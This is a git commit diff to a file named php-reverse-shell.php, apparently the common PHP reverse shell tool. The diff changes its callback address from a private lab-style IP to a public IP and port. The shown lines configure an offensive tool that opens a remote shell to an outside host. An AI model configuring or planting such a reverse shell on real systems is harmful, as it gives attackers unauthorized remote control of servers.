084c581f0a132f085efb3f4f80a677b0ae83c8df
Zer0Sploit <64222071+Zer0Sploit@users.noreply.github.com>
2022-06-09 15:33:49 +0400

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.14.8';  // CHANGE THIS
-$port = 3434;       // CHANGE THIS
+$ip = '51.79.87.218';  // CHANGE THIS
+$port = 1122;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
